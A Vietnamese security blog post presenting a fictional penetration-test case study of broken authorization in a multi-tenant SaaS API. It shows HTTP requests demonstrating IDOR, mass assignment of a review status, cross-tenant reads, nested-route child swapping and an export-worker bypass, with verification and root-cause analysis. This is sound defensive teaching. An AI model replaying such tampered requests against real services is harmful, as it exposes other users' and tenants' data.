---
title: "Kiểm thử Authorization trong SaaS multi-tenant: Case study với 5 lỗ hổng"
date: 2026-07-19 22:00:00 +0700
categories: [Web Security, Authorization]
tags: [authorization, broken-access-control, api-security, multi-tenant, idor, bola, mass-assignment]
pin: false
author: idkwhy07
---

> **Tuyên bố về case study giả lập:** Umber Desk 12, Northstar Relay Software, mọi tổ chức, người dùng, request, response và lỗ hổng trong bài viết này đều là hư cấu. Bài viết không mô tả một lỗ hổng đã được công bố trong sản phẩm thực tế.

## Hệ thống được kiểm thử

Umber Desk 12 là một ứng dụng SaaS multi-tenant dành cho các nhóm phụ trách tuân thủ sản phẩm. Hệ thống được sử dụng để quản lý hồ sơ tuân thủ, review note của Analyst, lưu trữ evidence và tạo các bản export phục vụ kiểm toán viên. Quá trình đánh giá sử dụng một test fixture sạch trên `api.umber-desk-12.test`. Tất cả mutable resource đều bắt đầu ở `version: 1`, export job bắt đầu được đánh số từ `job_01`, còn audit event bắt đầu từ `event_01`.

Resource hierarchy của hệ thống như sau:

```text
Organization
├── Members
├── Cases
│   ├── Notes
│   └── Evidence
└── Export jobs
```

Fixture có hai tổ chức.

```text
org_01 — Meldran Biomedical Works
├── usr_01 — Emma Carter   — Owner
├── usr_02 — Daniel Reed   — Manager
├── usr_03 — Ben Miller   — Analyst
├── usr_04 — Alex Turner  — Analyst
├── case_01 — Valve Recall Review
│   ├── assigned_analyst_id: usr_03
│   ├── note_01 — owner_id: usr_03 — review_status: draft — version: 1
│   └── evidence_01 — case_id: case_01 — version: 1
└── case_02 — Sterility Audit
    ├── assigned_analyst_id: usr_04
    ├── note_02 — owner_id: usr_04 — review_status: draft — version: 1
    └── evidence_02 — case_id: case_02 — version: 1

org_02 — Ternwick Transit Cooperative
├── usr_05 — Maya Collins   — Owner
├── usr_06 — Leo Foster    — Analyst
└── case_03 — Brake Sensor Certification
    ├── assigned_analyst_id: usr_06
    ├── note_03 — owner_id: usr_06 — review_status: draft — version: 1
    └── evidence_03 — case_id: case_03 — version: 1
```

Ứng dụng sử dụng opaque server-side session. Session xác định người dùng, nhưng bản thân session không tự cấp quyền truy cập vào case, note, evidence object hoặc export. Authentication xác lập subject; mỗi request vẫn cần một authorization decision riêng.

Policy rõ ràng do nhóm sản phẩm cung cấp như sau:

1. **Analyst** chỉ được liệt kê và đọc các case được phân công cho chính Analyst đó trong tổ chức của mình.
2. Analyst chỉ được đọc evidence khi evidence thuộc một case được phân công cho Analyst đó.
3. Analyst chỉ được tạo, đọc và cập nhật các note do chính Analyst đó sở hữu.
4. Với note do Analyst sở hữu, Analyst chỉ được cập nhật `title` và `body`.
5. Chỉ **Manager** hoặc **Owner** mới được thay đổi `review_status`, phê duyệt hoặc từ chối một note, và chỉ đối với các note nằm trong tổ chức của subject đó.
6. Manager được đọc mọi case, note và evidence object trong tổ chức của mình.
7. Manager được mời, tạm khóa hoặc khôi phục Analyst trong tổ chức của mình, nhưng không được gán role Owner, thay đổi Owner hoặc xóa tổ chức.
8. **Owner** có toàn bộ quyền của Manager, được gán role Manager cho member và được xóa tổ chức mà Owner sở hữu.
9. Không role nào được mặc nhiên cấp quyền truy cập tổ chức khác. Cross-tenant access bị từ chối trừ khi có share rõ ràng. Fixture không có share nào.
10. Nested route chỉ hợp lệ khi mọi relationship trong route đều đúng: case phải thuộc tổ chức và evidence phải thuộc case đó.
11. Authorization đối với export phải tương đương với direct access tới từng source object có trong export.
12. Authorization phải sử dụng membership và resource state hiện tại ở phía server trong mọi request và mọi lần worker thực thi.

Các quyền theo role là phần RBAC của mô hình; tenant ID và thuộc tính assignment cung cấp các điều kiện theo kiểu ABAC; còn các liên kết organization–case–evidence cung cấp điều kiện dựa trên relationship. Tại enforcement point, phần triển khai phải có đủ cả ba nhóm dữ kiện này.

## Lập Authorization matrix trước khi chỉnh sửa request

Khi kiểm kê request, có thể thấy các giá trị ảnh hưởng đến Authorization xuất hiện ở nhiều vị trí: session cookie chọn subject; các path segment chọn tổ chức, case, note và evidence; JSON body chọn property được phép ghi và source của export; query parameter lọc audit record; GraphQL variable chọn case cho dashboard; còn `X-Active-Organization` chọn một tổ chức trong số các membership mà người dùng hiện có. Mỗi giá trị đều có thể chọn ngữ cảnh, nhưng không giá trị nào được coi là bằng chứng về quyền.

Authorization matrix được lập trước khi gửi request đã bị chỉnh sửa. Cách làm này giúp tránh gắn nhãn lỗ hổng cho một response thành công trong trường hợp product policy thực sự cho phép hành vi đó, đồng thời giữ lại các control cho những luồng được kỳ vọng vẫn hoạt động.

| Subject | Action | Resource | Context | Expected outcome |
|---|---|---|---|---|
| Ben, Analyst `org_01` | Read | `case_01` | Được phân công cho Ben; cùng tenant | Allow |
| Ben, Analyst `org_01` | Read | `case_02` | Được phân công cho Alex; cùng tenant | Deny |
| Ben, Analyst `org_01` | Read | `case_03` | Được phân công cho Leo; khác tenant | Deny |
| Ben, Analyst `org_01` | Read | `note_01` | Ben sở hữu note; cùng tenant | Allow |
| Ben, Analyst `org_01` | Read | `note_02` | Alex sở hữu note; cùng tenant | Deny |
| Ben, Analyst `org_01` | Update `body` | `note_01` | Ben sở hữu note; property được phép | Allow |
| Ben, Analyst `org_01` | Update `review_status` | `note_01` | Property chỉ dành cho Manager/Owner | Deny |
| Ben, Analyst `org_01` | Approve | `note_02` | Khác owner và là privileged action | Deny |
| Ben, Analyst `org_01` | Delete | `note_01` | Analyst không có chức năng delete | Deny |
| Ben, Analyst `org_01` | Read | `evidence_01` | Thuộc `case_01` được phân công | Allow |
| Ben, Analyst `org_01` | Read | `evidence_02` | Thuộc `case_02` không được phân công | Deny |
| Ben, Analyst `org_01` | Read | `evidence_02` qua path `case_01` | Parent-child relationship không đúng | Deny |
| Ben, Analyst `org_01` | Export | `evidence_01` | Direct read được phép | Allow |
| Ben, Analyst `org_01` | Export | `evidence_03` | Direct read bị từ chối; khác tenant | Deny |
| Ben, Analyst `org_01` | GraphQL read | `evidence_01` | Cùng object policy; case được phân công | Allow |
| Ben, Analyst `org_01` | GraphQL read | `evidence_03` | Cùng object policy; khác tenant | Deny |
| Daniel, Manager `org_01` | Read | `case_01` | Cùng tenant | Allow |
| Daniel, Manager `org_01` | Read | `case_02` | Cùng tenant | Allow |
| Daniel, Manager `org_01` | Read | `case_03` | Khác tenant | Deny |
| Daniel, Manager `org_01` | Batch read | `case_01`, `case_02` | Cả hai đều thuộc tenant của Daniel | Allow |
| Daniel, Manager `org_01` | Batch read | `case_01`, `case_03` | Tập dữ liệu trộn nhiều tenant | Deny toàn bộ request |
| Daniel, Manager `org_01` | Approve | `note_01` | Cùng tenant | Allow |
| Daniel, Manager `org_01` | Suspend | Membership của Alex | Analyst trong cùng tenant | Allow |
| Daniel, Manager `org_01` | Gán role Owner | Bất kỳ member nào | Administrative action chỉ dành cho Owner | Deny |
| Emma, Owner `org_01` | Gán role Manager | Membership của Alex | Cùng tenant | Allow |
| Emma, Owner `org_01` | Delete | `org_01` | Tenant của chính Emma | Allow |
| Emma, Owner `org_01` | Read | `case_03` | Khác tenant | Deny |
| Leo, Analyst `org_02` | Read | `case_03` | Được phân công cho Leo; cùng tenant | Allow |
| Maya, Owner `org_02` | Read/update | `case_03` | Tenant của chính Maya | Allow |
| Maya, Owner `org_02` | Read audit event | Resource thuộc `org_02` | Tenant của chính Maya | Allow |

Matrix này tách riêng hai câu hỏi thường bị trộn lẫn: subject có được gọi một chức năng hay không, và subject có được gọi chức năng đó trên một object cụ thể hay không. Chẳng hạn, Ben có thể gọi chức năng cập nhật note, nhưng chỉ với note do Ben sở hữu và chỉ đối với các property được phép.

## Thiết lập các subject đã xác thực

Lần đăng nhập của Ben thiết lập test session đầu tiên.

```http
POST /api/v1/session HTTP/1.1
Host: api.umber-desk-12.test
Content-Type: application/json
Accept: application/json
Connection: close

{
  "email": "ben.miller@meldran.test",
  "password": "fixture-password"
}
```

```http
HTTP/1.1 201 Created
Content-Type: application/json
Set-Cookie: umberdesk12_session=sess_bm_1; Path=/; HttpOnly; Secure; SameSite=Lax
X-Request-Id: req_01
Connection: close

{
  "user_id": "usr_03",
  "session_state": "fully_authenticated"
}
```

Session ánh xạ tới membership hiện tại của Ben.

```http
GET /api/v1/me HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
X-Request-Id: req_02
Connection: close

{
  "user_id": "usr_03",
  "display_name": "Ben Miller",
  "memberships": [
    {
      "organization_id": "org_01",
      "role": "analyst",
      "state": "active"
    }
  ]
}
```

Các session đã xác thực đầy đủ tương đương cũng được chuẩn bị cho những người dùng còn lại:

| User | Session |
|---|---|
| Emma Carter | `sess_ec_1` |
| Daniel Reed | `sess_dr_1` |
| Ben Miller | `sess_bm_1` |
| Alex Turner | `sess_at_1` |
| Maya Collins | `sess_mc_1` |
| Leo Foster | `sess_lf_1` |

Trong mỗi proof, session của account thực hiện request được giữ nguyên và chỉ thay đổi một resource selector hoặc property selector. Một response chưa được coi là proof đầy đủ cho một lỗ hổng Authorization tồn tại thực sự hoặc tác động lên live state cho đến khi account thứ hai xác nhận độc lập object phía server hoặc audit state bị ảnh hưởng.

## Kiểm tra object boundary đầu tiên

Phép so sánh đầu tiên chỉ diễn ra trong `org_01`. Mục tiêu là kiểm tra quyền đọc note của Analyst có được giới hạn theo ownership hay API coi mọi Analyst đã xác thực trong cùng tenant là tương đương.

### Test 1 — Đọc note của Analyst khác

**Hypothesis.** Note endpoint có thể truy xuất note theo ID do client cung cấp và chỉ kiểm tra người gọi có phải active member trong tổ chức của note hay không. Nếu bỏ sót ownership, Ben có thể đọc note của Alex mà không cần thay đổi identity, role, tenant, method hoặc header.

**Legitimate baseline.** Ben gửi request để đọc note của chính mình.

```http
GET /api/v1/notes/note_01 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "note_01-v1"
X-Request-Id: req_03
Connection: close

{
  "id": "note_01",
  "organization_id": "org_01",
  "case_id": "case_01",
  "owner_id": "usr_03",
  "title": "Valve lot inspection",
  "body": "Initial inspection recorded.",
  "review_status": "draft",
  "version": 1
}
```

Đây là positive control đúng như kỳ vọng: subject `usr_03` thực hiện action `read` trên một note do `usr_03` sở hữu trong `org_01`.

**Modified request.** Trong request này, chỉ có object identifier trên path được thay đổi, từ `note_01` thành `note_02`. Session của Ben và mọi thành phần khác trong request đều được giữ nguyên.

```http
GET /api/v1/notes/note_02 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Accept: application/json
Connection: close
```

**Result.** API trả về note của Alex với `owner_id: usr_04`, mặc dù Ben không có ownership hay assignment relationship nào với `case_02`.

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "note_02-v1"
X-Request-Id: req_04
Connection: close

{
  "id": "note_02",
  "organization_id": "org_01",
  "case_id": "case_02",
  "owner_id": "usr_04",
  "title": "Sterility lot review",
  "body": "Lot 7 requires a second sample.",
  "review_status": "draft",
  "version": 1
}
```

Đây là horizontal object-level authorization failure: Ben và Alex có cùng role, nhưng Ben đã vượt qua ownership boundary để truy cập object của Alex.

**Independent verification.** Alex dùng session của chính Alex để cập nhật cùng note bằng một marker do người kiểm thử kiểm soát. Đây là một action hợp lệ của owner và làm note tăng từ version 1 lên version 2.

```http
PATCH /api/v1/notes/note_02 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_at_1
Content-Type: application/json
Accept: application/json
If-Match: "note_02-v1"
Connection: close

{
  "body": "Lot 7 requires a second sample. Verification marker: DP-1."
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "note_02-v2"
X-Request-Id: req_05
Connection: close

{
  "id": "note_02",
  "owner_id": "usr_04",
  "body": "Lot 7 requires a second sample. Verification marker: DP-1.",
  "review_status": "draft",
  "version": 2
}
```

Sau đó, Ben lặp lại lần đọc không được phép. Không có gì thay đổi ngoài việc response giờ phản ánh object state hiện tại. Response chứa marker của Alex và version 2, xác nhận response đầu tiên không phải detached cache entry hoặc object giả lập.

```http
GET /api/v1/notes/note_02 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "note_02-v2"
X-Request-Id: req_06
Connection: close

{
  "id": "note_02",
  "organization_id": "org_01",
  "case_id": "case_02",
  "owner_id": "usr_04",
  "title": "Sterility lot review",
  "body": "Lot 7 requires a second sample. Verification marker: DP-1.",
  "review_status": "draft",
  "version": 2
}
```

Direct object reference có thể bị điều khiển, nhưng định dạng identifier không phải root cause. Thay `note_02` bằng UUID vẫn không loại bỏ lỗ hổng nếu server tiếp tục truy xuất object mà không kiểm tra relationship giữa subject và note.

## Từ object chuyển sang một property được bảo vệ

Endpoint đầu tiên thực thi kiểm tra organization membership nhưng bỏ sót ownership. Update endpoint có vẻ chặt chẽ hơn vì Ben chỉ có thể sửa `note_01`, là note do Ben sở hữu. Câu hỏi tiếp theo là Authorization có được áp dụng cho từng writable property hay chỉ cho toàn bộ note object.

### Test 2 — Approve note thông qua mass assignment

**Hypothesis.** Note update handler có thể kiểm tra đúng quyền cập nhật `note_01` của Ben, nhưng lại ánh xạ toàn bộ JSON body vào database model. Nếu property được bảo vệ `review_status` không được đưa vào allowlist theo role, Analyst có thể thực hiện state transition chỉ dành cho Manager.

**Legitimate baseline.** Ben chỉ thay đổi property `body` trên note của chính mình. Version ban đầu là 1, nên lần cập nhật thành công tạo ra version 2.

```http
PATCH /api/v1/notes/note_01 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Content-Type: application/json
Accept: application/json
If-Match: "note_01-v1"
Connection: close

{
  "body": "Seal inspection complete."
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "note_01-v2"
X-Request-Id: req_07
Connection: close

{
  "id": "note_01",
  "owner_id": "usr_03",
  "title": "Valve lot inspection",
  "body": "Seal inspection complete.",
  "review_status": "draft",
  "version": 2
}
```

**Modified request.** Lần cập nhật hợp lệ vừa rồi được gửi lại trên cùng object và với cùng session. Thay đổi duy nhất là thêm một JSON property: `"review_status": "approved"`.

```http
PATCH /api/v1/notes/note_01 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Content-Type: application/json
Accept: application/json
If-Match: "note_01-v2"
Connection: close

{
  "body": "Seal inspection complete.",
  "review_status": "approved"
}
```

**Result.** Server chấp nhận property chỉ dành cho Manager và nâng note lên version 3.

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "note_01-v3"
X-Request-Id: req_08
Connection: close

{
  "id": "note_01",
  "owner_id": "usr_03",
  "title": "Valve lot inspection",
  "body": "Seal inspection complete.",
  "review_status": "approved",
  "version": 3
}
```

Quyết định ở object level là đúng vì Ben sở hữu `note_01`; phần còn thiếu là quyết định ở property level, bởi Ben không được phép ghi vào `review_status`. Đây là vertical privilege change thông qua mass assignment, không phải object-ownership bypass.

**Independent verification.** Daniel dùng Manager session để truy xuất bản ghi review từ review queue chỉ dành cho Manager. Endpoint này đọc server state hiện tại qua một controller riêng và xác nhận cả trạng thái được bảo vệ lẫn actor đã thay đổi nó.

```http
GET /api/v1/review-queue/notes/note_01 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_dr_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "note_01-v3"
X-Request-Id: req_09
Connection: close

{
  "id": "note_01",
  "organization_id": "org_01",
  "review_status": "approved",
  "status_changed_by": "usr_03",
  "version": 3
}
```

Frontend không hiển thị approval control cho Analyst, nhưng hạn chế đó không còn giá trị bảo mật khi backend chấp nhận property trực tiếp.

## Vượt qua tenant boundary bằng role có đặc quyền

Các lỗ hổng trước đều nằm trong `org_01`. Phép so sánh tiếp theo sử dụng Daniel vì quyền của Manager được thiết kế rộng trong phạm vi một tổ chức. Nhờ đó, điều kiện tenant trở thành biến Authorization duy nhất cần thay đổi.

### Test 3 — Đọc case từ tổ chức khác

**Hypothesis.** Manager case endpoint có thể chỉ kiểm tra `role in {"manager", "owner"}` rồi truy xuất case theo global ID. Nếu case query không được giới hạn theo tổ chức của Manager, Daniel có thể đọc một case thuộc phạm vi truy cập của Manager trong `org_02`.

**Legitimate baseline.** Daniel gửi request để đọc `case_01`, một case trong tổ chức của mình.

```http
GET /api/v1/manager/cases/case_01 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_dr_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "case_01-v1"
X-Request-Id: req_10
Connection: close

{
  "id": "case_01",
  "organization_id": "org_01",
  "title": "Valve Recall Review",
  "assigned_analyst_id": "usr_03",
  "summary": "Review opened.",
  "version": 1
}
```

**Modified request.** Giá trị duy nhất được thay đổi là case ID, từ `case_01` thành `case_03`. Manager session, route, method và header đều được giữ nguyên.

```http
GET /api/v1/manager/cases/case_03 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_dr_1
Accept: application/json
Connection: close
```

**Result.** API trả về `case_03` và xác định rõ tổ chức của case là `org_02`.

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "case_03-v1"
X-Request-Id: req_11
Connection: close

{
  "id": "case_03",
  "organization_id": "org_02",
  "title": "Brake Sensor Certification",
  "assigned_analyst_id": "usr_06",
  "summary": "Certification evidence pending.",
  "version": 1
}
```

Manager role của Daniel là hợp lệ, nhưng chỉ có hiệu lực trong `org_01`. Endpoint chỉ đưa ra quyết định dựa trên role mà không kiểm tra tenant scope.

**Independent verification.** Maya, Owner của `org_02`, thay đổi phần summary của case qua owner endpoint hợp lệ. Lần cập nhật này nâng `case_03` từ version 1 lên version 2.

```http
PATCH /api/v1/cases/case_03 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_mc_1
Content-Type: application/json
Accept: application/json
If-Match: "case_03-v1"
Connection: close

{
  "summary": "Owner verification marker: SQ-1."
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "case_03-v2"
X-Request-Id: req_12
Connection: close

{
  "id": "case_03",
  "organization_id": "org_02",
  "summary": "Owner verification marker: SQ-1.",
  "version": 2
}
```

Daniel lặp lại cross-tenant request và nhận được marker do Owner kiểm soát từ bản ghi hiện tại trong `org_02`.

```http
GET /api/v1/manager/cases/case_03 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_dr_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "case_03-v2"
X-Request-Id: req_13
Connection: close

{
  "id": "case_03",
  "organization_id": "org_02",
  "title": "Brake Sensor Certification",
  "assigned_analyst_id": "usr_06",
  "summary": "Owner verification marker: SQ-1.",
  "version": 2
}
```

Session của tenant thứ hai xác nhận Manager endpoint đã làm lộ live object thuộc `org_02`.

## Kiểm tra path có thực sự mang đúng relationship mà nó thể hiện hay không

Umber Desk 12 cũng cho phép truy cập evidence qua nested route. Route này chứa ba reference do client kiểm soát: tổ chức, case và evidence. Để đưa ra quyết định đúng, server phải kiểm tra cả ba resource và cả hai parent-child relationship.

### Test 4 — Cung cấp evidence object không thuộc case trên path

**Hypothesis.** Nested controller có thể kiểm tra quyền của Ben đối với `org_01` và `case_01` đã được phân công, rồi truy xuất evidence object cuối cùng theo `evidence_id` trên phạm vi global. Nếu controller không bắt buộc `evidence.case_id == case_id`, Ben có thể đặt một child không được phép truy cập dưới path của một parent được phép truy cập.

**Legitimate baseline.** Ben gửi request đọc `evidence_01` qua đúng parent chain của object.

```http
GET /api/v1/orgs/org_01/cases/case_01/evidence/evidence_01 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "evidence_01-v1"
X-Request-Id: req_14
Connection: close

{
  "id": "evidence_01",
  "organization_id": "org_01",
  "case_id": "case_01",
  "label": "Valve lot photograph",
  "sha256": "fixture-evidence-01",
  "version": 1
}
```

**Modified request.** Tổ chức và case vẫn là `org_01` và `case_01`. Giá trị duy nhất được thay đổi là identifier cuối cùng trên path, từ `evidence_01` thành `evidence_02`.

```http
GET /api/v1/orgs/org_01/cases/case_01/evidence/evidence_02 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Accept: application/json
Connection: close
```

**Result.** Response trả về `evidence_02` và làm lộ parent thực tế của object là `case_02`, không phải `case_01`.

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "evidence_02-v1"
X-Request-Id: req_15
Connection: close

{
  "id": "evidence_02",
  "organization_id": "org_01",
  "case_id": "case_02",
  "label": "Sterility sample manifest",
  "sha256": "fixture-evidence-02",
  "version": 1
}
```

Controller coi Authorization đối với parent path là Authorization cho mọi child ID. Relationship sai trong URL không được kiểm tra.

**Independent verification.** Alex, Analyst được phân công cho `case_02`, thay đổi label của `evidence_02` qua đúng path của object. Lần cập nhật hợp lệ này nâng evidence record lên version 2.

```http
PATCH /api/v1/orgs/org_01/cases/case_02/evidence/evidence_02 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_at_1
Content-Type: application/json
Accept: application/json
If-Match: "evidence_02-v1"
Connection: close

{
  "label": "Sterility sample manifest — DP-1"
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "evidence_02-v2"
X-Request-Id: req_16
Connection: close

{
  "id": "evidence_02",
  "organization_id": "org_01",
  "case_id": "case_02",
  "label": "Sterility sample manifest — DP-1",
  "sha256": "fixture-evidence-02",
  "version": 2
}
```

Ben lặp lại nested request có relationship không khớp và nhận được label hiện tại của Alex cùng version mới.

```http
GET /api/v1/orgs/org_01/cases/case_01/evidence/evidence_02 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "evidence_02-v2"
X-Request-Id: req_17
Connection: close

{
  "id": "evidence_02",
  "organization_id": "org_01",
  "case_id": "case_02",
  "label": "Sterility sample manifest — DP-1",
  "sha256": "fixture-evidence-02",
  "version": 2
}
```

Account thứ hai xác nhận nested route đã trả về live child thuộc một case khác.

## Kiểm thử cùng object qua một action khác

Direct evidence access và export là hai code path khác nhau đối với cùng một business object. Direct controller áp dụng kiểm tra assignment và tenant. Tính năng export lại đưa công việc vào queue để một asynchronous service xử lý, vì vậy bài test cuối so sánh policy enforcement giữa các path này.

### Test 5 — Export cross-tenant evidence qua asynchronous worker

**Hypothesis.** Export API có thể xác nhận rằng Ben đã được xác thực và được phép tạo export job, nhưng lại để source-object authorization cho worker xử lý trong khi worker truy xuất evidence theo ID trên phạm vi global. Khi đó, direct evidence route có thể từ chối `evidence_03` nhưng export path vẫn xử lý object này.

**Legitimate baseline.** Ben yêu cầu export `evidence_01` dưới định dạng JSON. Ben được phép đọc evidence này thông qua `case_01` đã được phân công.

```http
POST /api/v1/exports HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Content-Type: application/json
Accept: application/json
Connection: close

{
  "format": "json",
  "source_type": "evidence",
  "source_id": "evidence_01"
}
```

```http
HTTP/1.1 202 Accepted
Content-Type: application/json
Location: /api/v1/exports/job_01
X-Request-Id: req_18
Connection: close

{
  "job_id": "job_01",
  "state": "queued",
  "version": 1
}
```

Job hợp lệ hoàn tất và vẫn liên kết với `evidence_01`.

```http
GET /api/v1/exports/job_01 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
X-Request-Id: req_19
Connection: close

{
  "job_id": "job_01",
  "state": "completed",
  "source_id": "evidence_01",
  "download_path": "/api/v1/exports/job_01/download",
  "version": 2
}
```

**Modified request.** Session, method, endpoint, format và source type đều được giữ nguyên. Property duy nhất thay đổi là `source_id`, từ `evidence_01` thành cross-tenant `evidence_03`.

```http
POST /api/v1/exports HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Content-Type: application/json
Accept: application/json
Connection: close

{
  "format": "json",
  "source_type": "evidence",
  "source_id": "evidence_03"
}
```

**Result.** API tạo `job_02`, và worker hoàn tất job với `evidence_03`.

```http
HTTP/1.1 202 Accepted
Content-Type: application/json
Location: /api/v1/exports/job_02
X-Request-Id: req_20
Connection: close

{
  "job_id": "job_02",
  "state": "queued",
  "version": 1
}
```

```http
GET /api/v1/exports/job_02 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
X-Request-Id: req_21
Connection: close

{
  "job_id": "job_02",
  "state": "completed",
  "source_id": "evidence_03",
  "download_path": "/api/v1/exports/job_02/download",
  "version": 2
}
```

Export đã hoàn tất làm lộ evidence record thuộc `org_02`.

```http
GET /api/v1/exports/job_02/download HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Disposition: attachment; filename="evidence_03.json"
X-Request-Id: req_22
Connection: close

{
  "id": "evidence_03",
  "organization_id": "org_02",
  "case_id": "case_03",
  "label": "Brake sensor calibration log",
  "sha256": "fixture-evidence-03",
  "version": 1
}
```

Primary evidence endpoint thực thi boundary mà export path bỏ sót. Với cùng session của Ben, direct access tới `evidence_03` trả về `403 Forbidden`.

```http
GET /api/v1/evidence/evidence_03 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_bm_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 403 Forbidden
Content-Type: application/problem+json
X-Request-Id: req_23
Connection: close

{
  "type": "https://api.umber-desk-12.test/problems/forbidden",
  "title": "Forbidden",
  "status": 403
}
```

Sự khác biệt này chứng minh Authorization đã tồn tại đối với object nhưng không được áp dụng nhất quán cho mọi action và access path.

**Independent verification.** Maya truy vấn audit stream của `org_02` bằng Owner session. Audit service ghi nhận rằng `usr_03` từ `org_01` đã khiến export worker đọc `evidence_03` và hoàn tất `job_02`.

```http
GET /api/v1/orgs/org_02/audit-events?resource_id=evidence_03 HTTP/1.1
Host: api.umber-desk-12.test
Cookie: umberdesk12_session=sess_mc_1
Accept: application/json
Connection: close
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
X-Request-Id: req_24
Connection: close

{
  "events": [
    {
      "id": "event_01",
      "organization_id": "org_02",
      "action": "export.completed",
      "resource_id": "evidence_03",
      "job_id": "job_02",
      "actor_user_id": "usr_03",
      "actor_organization_id": "org_01"
    }
  ]
}
```

Audit state của tenant thứ hai xác nhận độc lập rằng worker đã xử lý object được bảo vệ cho một subject không được phép.

## Tổng hợp finding

| ID | Proof endpoint | Broken boundary | Expected | Actual | Security effect | Classification |
|---|---|---|---|---|---|---|
| F-01 | `GET /api/v1/notes/note_02` với Ben | Ownership giữa các người dùng cùng role | Deny | `200`, live note của Alex được trả về | Đọc note của Analyst khác khi không được phép | Horizontal object-level authorization failure |
| F-02 | `PATCH /api/v1/notes/note_01` kèm `review_status` với Ben | Quyền giữa role và property | Từ chối property được bảo vệ; giữ nguyên `draft` | `200`, Analyst đổi trạng thái thành `approved` | Analyst thực hiện state transition chỉ dành cho Manager | Broken object property-level authorization / mass assignment |
| F-03 | `GET /api/v1/manager/cases/case_03` với Daniel | Tenant scope | Deny | `200`, live case thuộc `org_02` được trả về | Làm lộ case cross-tenant | Thiếu tenant-scope check |
| F-04 | `GET /orgs/org_01/cases/case_01/evidence/evidence_02` với Ben | Parent-child relationship và assignment relationship | Deny | `200`, child thuộc `case_02` được trả về | Đọc evidence trái phép qua nested path có relationship sai | Parent-child relationship không được kiểm tra |
| F-05 | `POST /api/v1/exports` với `source_id: evidence_03` bằng session Ben | Policy tương đương giữa direct path và indirect path | Từ chối job | `202`, worker hoàn tất và download trả về evidence thuộc `org_02` | Làm lộ dữ liệu cross-tenant qua asynchronous export | Indirect-path authorization bypass |

Các finding này tương ứng với những nhóm API Authorization đã được thiết lập. F-01, F-03, F-04 và F-05 là object-level authorization failure trong các ngữ cảnh khác nhau. F-02 là property-level authorization failure thông qua automatic binding. Quy tắc approve chỉ dành cho Manager cũng cho thấy vì sao role permission và object permission không thể bị gộp thành một check duy nhất như `is_authenticated` hoặc `can_update_note`.

## Một root cause, năm biểu hiện khác nhau

Năm kết quả đều bắt nguồn từ một architectural pattern: **Umber Desk 12 truy xuất resource và property do client lựa chọn thông qua generic data-access code, trong khi Authorization chỉ được triển khai bằng những check cục bộ, không đầy đủ tại từng route thay vì một policy decision hoàn chỉnh.**

Quyết định Authorization dự kiến cho mỗi request là:

```text
allow = policy(
  subject=current authenticated user and current membership,
  action=read | update | approve | export,
  resource=the actual note, case, or evidence object,
  context={
    organization,
    ownership,
    assignment,
    parent-child relationships,
    mutable property set,
    current resource state
  }
)
```

Mỗi vulnerable code path đều âm thầm bỏ sót một đầu vào bắt buộc:

| Finding | Đầu vào bị bỏ khỏi quyết định |
|---|---|
| F-01 | Ownership của note |
| F-02 | Property-level permission và state-transition permission |
| F-03 | So sánh tenant của resource với tenant trong membership của subject |
| F-04 | Relationship giữa evidence và case |
| F-05 | Source-object authorization trong export path và worker |

